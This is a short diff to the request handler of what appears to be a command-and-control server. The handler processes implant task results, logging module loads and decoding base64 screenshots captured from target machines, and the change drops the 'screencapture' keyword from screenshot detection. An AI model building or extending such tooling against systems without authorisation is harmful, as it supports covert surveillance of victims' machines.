@@ -327,7 +327,7 @@ class MyHandler(BaseHTTPRequestHandler):
                     if "loadmodule" in executedCmd:
                         print("Module loaded successfully")
                         update_task(taskId, "Module loaded successfully")
-                    elif "get-screenshot" in executedCmd.lower() or "screencapture" in executedCmd.lower():
+                    elif "get-screenshot" in executedCmd.lower():
                         try:
                             decoded = base64.b64decode(outputParsed)
                             filename = i[3] + "-" + now.strftime("%m%d%Y%H%M%S_" + randomuri())
